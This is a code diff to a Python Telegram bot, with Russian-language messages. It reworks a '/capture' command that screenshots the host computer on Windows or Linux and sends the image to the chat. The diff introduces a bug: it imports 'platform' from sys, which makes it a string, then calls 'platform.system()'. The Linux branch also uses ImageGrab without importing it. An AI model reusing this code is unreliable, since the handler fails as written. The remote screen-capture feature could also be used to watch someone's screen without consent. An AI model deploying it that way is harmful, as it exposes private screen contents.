@@ -1,8 +1,12 @@
+from sys import platform
+
 import pyautogui as pyautogui
+import telebot
+
 
 @bot.message_handler(commands=["capture"])
-if platform.system() == "Windows":
-    def capture_pc(message):
+def capture_pc(message):
+    if platform.system() == "Windows":
         bot.send_chat_action(message.chat.id, 'upload_photo')
         try:
             filename = f"{time.time()}.jpg"
@@ -12,8 +16,7 @@ if platform.system() == "Windows":
             os.remove(filename)
         except:
             bot.send_message(message.chat.id, "Что-то пошло не так")
-elif platform.system() == "Linux":
-    def screenshot(message):
+    elif platform.system() == "Linux":
         try:
             img = ImageGrab.grab()
             img.save("screenshot.jpg", quality="web_medium")
@@ -26,3 +29,4 @@ elif platform.system() == "Linux":
 
 
 menu.append(telebot.types.BotCommand("/capture", "Высылает скриншот с экрана компьютера"))
+
